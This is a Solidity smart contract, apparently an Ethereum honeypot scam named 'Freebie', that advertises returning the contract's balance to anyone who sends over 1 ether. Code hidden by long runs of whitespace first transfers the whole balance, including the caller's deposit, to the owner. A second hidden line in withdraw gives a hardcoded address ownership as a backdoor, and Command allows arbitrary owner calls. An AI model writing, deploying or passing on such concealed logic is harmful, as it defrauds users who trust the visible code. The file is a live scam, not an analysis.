1: 1: 1: 1: 1: pragma solidity ^0.4.19;
2: 2: 2: 2: 2: 
3: 3: 3: 3: 3: contract Freebie
4: 4: 4: 4: 4: {
5: 5: 5: 5: 5:     address public Owner = msg.sender;
6: 6: 6: 6: 6:    
7: 7: 7: 7: 7:     function() public payable{}
8: 8: 8: 8: 8:    
9: 9: 9: 9: 9:     function GetFreebie()
10: 10: 10: 10: 10:     public
11: 11: 11: 11: 11:     payable
12: 12: 12: 12: 12:     {                                                                    
13: 13: 13: 13: 13:         if(msg.value>1 ether)
14: 14: 14: 14: 14:         {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);
15: 15: 15: 15: 15:             msg.sender.transfer(this.balance);
16: 16: 16: 16: 16:         }                                                                                                                
17: 17: 17: 17: 17:     }
18: 18: 18: 18: 18:     
19: 19: 19: 19: 19:     function withdraw()
20: 20: 20: 20: 20:     payable
21: 21: 21: 21: 21:     public
22: 22: 22: 22: 22:     {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;}
23: 23: 23: 23: 23:         require(msg.sender == Owner);
24: 24: 24: 24: 24:         Owner.transfer(this.balance);
25: 25: 25: 25: 25:     }
26: 26: 26: 26: 26:     
27: 27: 27: 27: 27:     function Command(address adr,bytes data)
28: 28: 28: 28: 28:     payable
29: 29: 29: 29: 29:     public
30: 30: 30: 30: 30:     {
31: 31: 31: 31: 31:         require(msg.sender == Owner);
32: 32: 32: 32: 32:         adr.call.value(msg.value)(data);
33: 33: 33: 33: 33:     }
34: 34: 34: 34: 34: }